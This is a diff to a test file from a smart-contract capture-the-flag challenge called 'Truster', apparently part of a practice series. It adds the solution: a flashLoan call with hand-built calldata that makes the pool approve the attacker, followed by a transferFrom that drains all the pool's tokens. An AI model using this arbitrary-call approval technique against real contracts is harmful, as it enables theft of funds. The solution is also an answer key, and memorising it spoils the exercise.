@@ -29,6 +29,10 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+        const func_sign = ethers.utils.solidityKeccak256(['string'],['approve(address,uint256)']).slice(2,10);
+        const vals = ethers.utils.solidityPack(['address', 'uint256'],[attacker.address, TOKENS_IN_POOL]);
+        await this.pool.connect(attacker).flashLoan(0, attacker.address, this.token.address, "0x" + func_sign + "000000000000000000000000" + vals.slice(2,));
+        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
     });
 
     after(async function () {
